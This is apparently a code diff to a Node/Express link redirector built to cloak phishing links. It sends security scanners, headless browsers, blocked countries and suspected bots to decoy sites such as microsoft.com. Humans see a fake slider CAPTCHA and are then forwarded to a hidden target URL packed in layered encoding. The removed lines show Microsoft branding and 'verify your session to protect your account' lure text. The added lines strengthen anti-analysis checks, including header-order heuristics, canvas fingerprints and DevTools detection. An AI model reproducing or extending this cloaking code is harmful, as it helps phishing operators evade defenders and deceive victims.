@@ -13,21 +13,21 @@ app.set('trust proxy', 1);
 // CONFIG
 // ────────────────────────────────────────────────
 const TARGET_URL = process.env.TARGET_URL || 'https://www.microsoft.com';
+
 const BOT_URLS = [
   'https://www.microsoft.com',
   'https://www.apple.com',
   'https://en.wikipedia.org/wiki/Main_Page',
-  'https://www.google.com'
+  'https://www.google.com',
+  'https://www.bbc.com'
 ];
+
 const ALLOWED_COUNTRIES = (process.env.ALLOWED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
 const BLOCKED_COUNTRIES = (process.env.BLOCKED_COUNTRIES || '').toUpperCase().split(',').filter(Boolean);
 const GEO_API_URL = process.env.GEO_API_URL || 'https://ipapi.co/{ip}/country/';
 
 const LOG_FILE = 'clicks.log';
 const PORT = process.env.PORT || 3000;
-
-// Small base64 Microsoft logo (2026 style - you can replace with newer one)
-const MS_LOGO_BASE64 = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZD0iTTEwIDJ2N0g1VjJ6TTIgMTBoN3Y3SDJ6TTEwIDE1djdoN3YtN3ptNy03djdoN3YtN3oiIGZpbGw9IiMwMDY3YzUiLz48L3N2Zz4=';
 
 // ────────────────────────────────────────────────
 // CSP
@@ -57,7 +57,7 @@ app.use(express.urlencoded({ extended: true }));
 app.get(['/ping', '/health', '/healthz', '/status'], (req, res) => res.status(200).send('OK'));
 
 // ────────────────────────────────────────────────
-// BOT DETECTION & RATE LIMIT
+// BOT DETECTION & RATE LIMIT – ENHANCED
 // ────────────────────────────────────────────────
 const strictLimiter = rateLimit({
   windowMs: 60 * 1000,
@@ -67,7 +67,11 @@ const strictLimiter = rateLimit({
   legacyHeaders: false,
 });
 
-const suspiciousUA = [/headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i, /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i, /zoomeye/i, /nmap/i, /gobuster/i];
+const suspiciousUA = [
+  /headless/i, /phantom/i, /slurp/i, /zgrab/i, /scanner/i, /bot/i,
+  /crawler/i, /spider/i, /burp/i, /sqlmap/i, /nessus/i, /censys/i,
+  /zoomeye/i, /nmap/i, /gobuster/i
+];
 
 function isLikelyBot(req) {
   const ua = (req.headers['user-agent'] || '').toLowerCase();
@@ -75,15 +79,38 @@ function isLikelyBot(req) {
   const accept = req.headers['accept'] || '';
 
   let score = 0;
+
+  // Existing checks
   if (suspiciousUA.some(r => r.test(ua))) score += 30;
   if (!ua.includes('mozilla')) score += 15;
   if (ua.includes('compatible ;') || ua.includes('windows nt 5')) score += 12;
-  if (ref && !['outlook','office','microsoft','live.com','hotmail'].some(r => ref.includes(r))) score += 10;
+  if (ref && !['google','bing','yahoo','duckduckgo'].some(r => ref.includes(r))) score += 10;
   if (!accept.includes('text/html')) score += 10;
   if (!req.headers['sec-fetch-site'] || !req.headers['sec-fetch-mode']) score += 20;
-  if (!req.headers['accept-language']) score += 12;
+  if (!req.headers['accept-language'] || req.headers['accept-language'].length < 4) score += 14;
 
-  return score >= 45;
+  // ─── New server-side checks ───
+  // Missing modern client hints
+  if (!req.headers['sec-ch-ua'] || !req.headers['sec-ch-ua-mobile'] || !req.headers['sec-ch-ua-platform']) {
+    score += 18;
+  }
+  // Missing Upgrade-Insecure-Requests (real browsers usually send it)
+  if (!req.headers['upgrade-insecure-requests']) {
+    score += 12;
+  }
+  // Alphabetically sorted headers (some bots sort them)
+  const headerKeys = Object.keys(req.headers);
+  const sortedKeys = [...headerKeys].sort();
+  if (headerKeys.join() === sortedKeys.join()) {
+    score += 16;
+  }
+  // Very minimal header set (real browsers send 15–25+ headers)
+  if (headerKeys.length < 10) {
+    score += 15;
+  }
+
+  console.log(`[BOT CHECK] ${req.ip} | Score: ${score} | UA: ${ua.substring(0,80)}`);
+  return score >= 50; // raised threshold slightly due to new signals
 }
 
 // ────────────────────────────────────────────────
@@ -98,19 +125,21 @@ async function getCountryCode(req) {
   try {
     const res = await fetch(GEO_API_URL.replace('{ip}', ip), { timeout: 3000 });
     if (res.ok) return (await res.text()).trim().toUpperCase();
-  } catch {}
+  } catch (err) {
+    console.log(`[GEO FAIL] ${ip} | ${err.message}`);
+  }
   return 'XX';
 }
 
 // ────────────────────────────────────────────────
-// MULTI-LAYER ENCODING (improved noise handling)
+// MULTI-LAYER ENCODING / DECODING
 // ────────────────────────────────────────────────
 const encoders = [
-  { name: 'base64', enc: s => Buffer.from(s).toString('base64'), dec: s => Buffer.from(s, 'base64').toString() },
-  { name: 'base64url', enc: s => Buffer.from(s).toString('base64url'), dec: s => Buffer.from(s, 'base64url').toString() },
-  { name: 'rot13', enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)) },
-  { name: 'hex', enc: s => Buffer.from(s).toString('hex'), dec: s => Buffer.from(s, 'hex').toString() },
-  { name: 'urlencode', enc: encodeURIComponent, dec: decodeURIComponent },
+  { name: 'base64',     enc: s => Buffer.from(s).toString('base64'),     dec: s => Buffer.from(s, 'base64').toString() },
+  { name: 'base64url',  enc: s => Buffer.from(s).toString('base64url'),  dec: s => Buffer.from(s, 'base64url').toString() },
+  { name: 'rot13',      enc: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26)), dec: s => s.replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) - 13) ? c : c + 26)) },
+  { name: 'hex',        enc: s => Buffer.from(s).toString('hex'),        dec: s => Buffer.from(s, 'hex').toString() },
+  { name: 'urlencode',  enc: encodeURIComponent,                         dec: decodeURIComponent },
 ];
 
 function multiLayerEncode(str) {
@@ -146,7 +175,6 @@ function multiLayerDecode(encoded, layers, noise) {
     result = layer.dec(result);
   }
 
-  // Improved noise removal using known noise length
   if (noise && result.startsWith(noise) && result.endsWith(noise)) {
     result = result.slice(noise.length, -noise.length);
   }
@@ -186,11 +214,12 @@ app.get('/generate', (req, res) => {
 });
 
 // ────────────────────────────────────────────────
-// MAIN ROUTE /r/*
+// MAIN ROUTE /r/*  – NEUTRAL + STRONGER BOT DETECTION
 // ────────────────────────────────────────────────
 app.get('/r/*', strictLimiter, async (req, res) => {
   const ua = req.headers['user-agent'] || '';
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'unknown';
+
   const country = await getCountryCode(req);
 
   let geoAllowed = true;
@@ -198,12 +227,14 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   if (BLOCKED_COUNTRIES.includes(country)) geoAllowed = false;
 
   if (!geoAllowed || isLikelyBot(req)) {
-    fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${geoAllowed ? 'BOT_BLOCK' : 'GEO_BLOCKED'} ${ip} ${country}\n`, () => {});
+    const reason = !geoAllowed ? 'GEO_BLOCKED' : 'BOT_BLOCK';
+    fs.appendFile(LOG_FILE, `${new Date().toISOString()} ${reason} ${ip} ${country}\n`, () => {});
     return res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]);
   }
 
   fs.appendFile(LOG_FILE, `${new Date().toISOString()} ACCESS ${ip} ${country} ${ua}\n`, () => {});
 
+  // Decode target
   let redirectTarget = TARGET_URL;
   try {
     const query = req.url.split('?')[1] || '';
@@ -232,7 +263,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   const safeTarget = redirectTarget.replace(/'/g, "\\'").replace(/\\/g, "\\\\");
 
   // ────────────────────────────────────────────────
-  // IMPROVED VERIFICATION PAGE
+  // NEUTRAL VERIFICATION PAGE + STRONG CLIENT-SIDE BOT DETECTION
   // ────────────────────────────────────────────────
   res.send(`
 <!DOCTYPE html>
@@ -240,37 +271,113 @@ app.get('/r/*', strictLimiter, async (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Session Verification - Microsoft</title>
+  <title>Security Verification</title>
   <style>
-    body { font-family: 'Segoe UI', system-ui, sans-serif; background:#f3f2f1; margin:0; display:flex; align-items:center; justify-content:center; min-height:100vh; color:#333; }
-    .box { background:white; padding:40px; border-radius:12px; box-shadow:0 4px 20px rgba(0,0,0,0.15); text-align:center; max-width:440px; width:92%; }
-    .loader { border:5px solid #e5e5e5; border-top:5px solid #0067c5; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:0 auto 24px; }
-    @keyframes spin { to { transform:rotate(360deg); } }
-    h2 { margin:0 0 16px; font-size:1.6rem; }
-    p { margin:0 0 20px; color:#555; }
-    #canvas-container { position:relative; margin:24px auto; width:320px; height:200px; border:1px solid #d1d1d1; border-radius:8px; overflow:hidden; background:#f9f9f9; }
-    canvas { position:absolute; top:0; left:0; }
-    #slider { width:100%; height:56px; margin:24px 0 12px; background:#e8e8e8; border-radius:28px; position:relative; cursor:grab; }
-    #slider-knob { position:absolute; top:8px; left:8px; width:40px; height:40px; background:#0067c5; border-radius:50%; box-shadow:0 3px 10px rgba(0,0,0,0.25); transition:left 0.12s; }
-    #instructions { font-size:1rem; color:#444; margin-bottom:16px; }
-    #error-msg { color:#c42b1c; margin-top:16px; font-size:0.95rem; display:none; }
-    .ms-logo { width:90px; height:auto; margin-bottom:20px; }
-    #loading { position:absolute; inset:0; background:rgba(255,255,255,0.92); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:10; }
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      background: #f5f5f5;
+      margin: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #222;
+    }
+    .box {
+      background: white;
+      padding: 44px 36px;
+      border-radius: 12px;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.08);
+      text-align: center;
+      max-width: 440px;
+      width: 92%;
+    }
+    .loader {
+      border: 5px solid #eee;
+      border-top: 5px solid #4a90e2;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1.1s linear infinite;
+      margin: 0 auto 28px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 {
+      margin: 0 0 16px;
+      font-size: 1.65rem;
+      font-weight: 600;
+    }
+    p {
+      margin: 0 0 24px;
+      color: #555;
+      line-height: 1.45;
+    }
+    #canvas-container {
+      position: relative;
+      margin: 28px auto;
+      width: 320px;
+      height: 200px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      overflow: hidden;
+      background: #fafafa;
+    }
+    canvas { position: absolute; top: 0; left: 0; }
+    #slider {
+      width: 100%;
+      height: 56px;
+      margin: 28px 0 16px;
+      background: #f0f0f0;
+      border-radius: 28px;
+      position: relative;
+      cursor: grab;
+    }
+    #slider-knob {
+      position: absolute;
+      top: 8px;
+      left: 8px;
+      width: 40px;
+      height: 40px;
+      background: #4a90e2;
+      border-radius: 50%;
+      box-shadow: 0 3px 10px rgba(0,0,0,0.2);
+      transition: left 0.12s;
+    }
+    #instructions {
+      font-size: 1rem;
+      color: #444;
+      margin-bottom: 20px;
+    }
+    #error-msg {
+      color: #d32f2f;
+      margin-top: 16px;
+      font-size: 0.95rem;
+      display: none;
+    }
+    #loading {
+      position: absolute;
+      inset: 0;
+      background: rgba(255,255,255,0.95);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 10;
+    }
   </style>
 </head>
 <body>
   <div class="box">
-    <img src="${MS_LOGO_BASE64}" alt="Microsoft" class="ms-logo">
-    <h2>Verify your session</h2>
-    <p>We're confirming this is you to protect your account.</p>
+    <h2>Security Verification</h2>
+    <p>This quick check helps us confirm you're not automated.</p>
 
     <div id="loading">
       <div class="loader"></div>
-      <p>Preparing secure verification...</p>
+      <p>Preparing verification...</p>
     </div>
 
     <div id="content" style="display:none;">
-      <div id="instructions">Drag the piece to complete the image</div>
+      <div id="instructions">Slide the piece into place</div>
       <div id="canvas-container">
         <canvas id="bgCanvas" width="320" height="200"></canvas>
         <canvas id="pieceCanvas" width="320" height="200"></canvas>
@@ -288,17 +395,76 @@ app.get('/r/*', strictLimiter, async (req, res) => {
     const TARGET_URL = '${safeTarget}';
     const BOT_URL    = '${BOT_URLS[0]}';
 
-    // ─── Behavioral + Headless detection ───
-    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
-    let focusLost = 0;
-
-    if (navigator.webdriver || !window.chrome || window.outerWidth === 0 || navigator.plugins.length === 0) {
+    // ─── STRONG CLIENT-SIDE BOT DETECTION ───
+    // 1. Classic headless & automation flags
+    if (
+      navigator.webdriver ||
+      window.outerWidth === 0 ||
+      window.outerHeight === 0 ||
+      navigator.plugins.length === 0 ||
+      navigator.languages.length === 0 ||
+      navigator.hardwareConcurrency === undefined ||
+      navigator.deviceMemory === undefined ||
+      !navigator.userAgent.includes('Chrome') && !navigator.userAgent.includes('Firefox') && !navigator.userAgent.includes('Safari')
+    ) {
       location.href = BOT_URL;
     }
 
+    // 2. Missing or incomplete chrome object (common in headless Chrome)
+    if (window.chrome === undefined || !window.chrome.runtime || !window.chrome.loadTimes) {
+      location.href = BOT_URL;
+    }
+
+    // 3. Canvas fingerprint check against known bot patterns
+    const testCanvas = document.createElement('canvas');
+    const ctx = testCanvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Hello, world!', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Hello, world!', 4, 17);
+
+    const canvasData = testCanvas.toDataURL();
+
+    // Known bot / headless canvas fingerprints (partial list – update as needed)
+    const botCanvasPatterns = [
+      'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAYAAAB5fY51', // puppeteer-like
+      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z/C/HgAHgwJ/lK3Q6wAAAABJRU5ErkJggg==', // minimal/empty
+      'AAAAAElFTkSuQmCC' // very short / suspicious
+    ];
+
+    if (botCanvasPatterns.some(p => canvasData.includes(p))) {
+      location.href = BOT_URL;
+    }
+
+    // 4. DevTools / console open detection
+    const devtoolsCheck = /./;
+    devtoolsCheck.toString = function() {
+      entropy -= 30; // heavy penalty
+      return 'devtools detected';
+    };
+    console.log('%c', devtoolsCheck);
+
+    // 5. Very fast or linear mouse movement detection
+    let lastMoveTime = 0;
+    document.addEventListener('mousemove', e => {
+      const now = Date.now();
+      if (now - lastMoveTime < 6) { // unrealistically fast
+        entropy -= 12;
+      }
+      lastMoveTime = now;
+    }, {passive: true});
+
+    // ─── Behavioral tracking (existing + tightened) ───
+    let moves = 0, entropy = 0, lastX = 0, lastY = 0, lastTime = Date.now();
+    let focusLost = 0;
+
     const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-    const minMoves   = mobile ? 5 : 7;
-    const minEntropy = mobile ? 14 : 22;
+    const minMoves   = mobile ? 6 : 8;
+    const minEntropy = mobile ? 16 : 26;
 
     function updateEntropy(dx, dy) {
       const now = Date.now();
@@ -325,7 +491,7 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       if (document.hidden) focusLost++;
     });
 
-    // ─── Puzzle ───
+    // ─── Neutral puzzle ───
     const bg = document.getElementById('bgCanvas').getContext('2d');
     const piece = document.getElementById('pieceCanvas').getContext('2d');
     const knob = document.getElementById('slider-knob');
@@ -336,14 +502,14 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       targetX = 50 + Math.random() * 200;
       puzzleX = 0;
 
-      // Copilot+ themed background
       const grad = bg.createLinearGradient(0,0,320,200);
-      grad.addColorStop(0, '#e6f0ff'); grad.addColorStop(1, '#cce0ff');
+      grad.addColorStop(0, '#f8f9fa');
+      grad.addColorStop(1, '#e9ecef');
       bg.fillStyle = grad; bg.fillRect(0,0,320,200);
 
-      bg.fillStyle = '#0067c5'; bg.fillRect(30, 50, 260, 100);
-      bg.font = 'bold 32px "Segoe UI", sans-serif';
-      bg.fillStyle = 'white'; bg.fillText('Copilot+', 90, 110);
+      bg.fillStyle = '#4a90e2'; bg.fillRect(30, 50, 260, 100);
+      bg.font = 'bold 32px system-ui, sans-serif';
+      bg.fillStyle = '#ffffff'; bg.fillText('Secure', 100, 110);
 
       redrawPiece();
     }
@@ -359,13 +525,12 @@ app.get('/r/*', strictLimiter, async (req, res) => {
       piece.closePath();
       piece.clip();
       piece.drawImage(document.getElementById('bgCanvas'), puzzleX, 70, pieceSize, 64, puzzleX, 70, pieceSize, 64);
-      piece.shadowColor = 'rgba(0,0,0,0.35)'; piece.shadowBlur = 10;
-      piece.strokeStyle = '#777'; piece.lineWidth = 2.5;
+      piece.shadowColor = 'rgba(0,0,0,0.3)'; piece.shadowBlur = 10;
+      piece.strokeStyle = '#999'; piece.lineWidth = 2.5;
       piece.strokeRect(puzzleX, 70, pieceSize, 64);
       piece.restore();
     }
 
-    // Drag logic
     let dragging = false, startX = 0;
 
     knob.addEventListener('mousedown', e => { dragging = true; startX = e.clientX - puzzleX; e.preventDefault(); });
@@ -392,13 +557,12 @@ app.get('/r/*', strictLimiter, async (req, res) => {
         setTimeout(() => location.href = TARGET_URL, 900 + Math.random()*1400);
       } else if (dist < 10) {
         const err = document.getElementById('error-msg');
-        err.textContent = 'Please complete the verification.';
+        err.textContent = 'Please complete the verification step.';
         err.style.display = 'block';
         setTimeout(() => { err.style.display = 'none'; generatePuzzle(); }, 2200);
       }
     }
 
-    // Fake loading → reveal puzzle
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('content').style.display = 'block';
@@ -412,6 +576,9 @@ app.get('/r/*', strictLimiter, async (req, res) => {
   `);
 });
 
+// Catch-all redirect
 app.use((req, res) => res.redirect(BOT_URLS[Math.floor(Math.random() * BOT_URLS.length)]));
 
-app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, '0.0.0.0', () => {
+  console.log(`Server running on port ${PORT}`);
+});
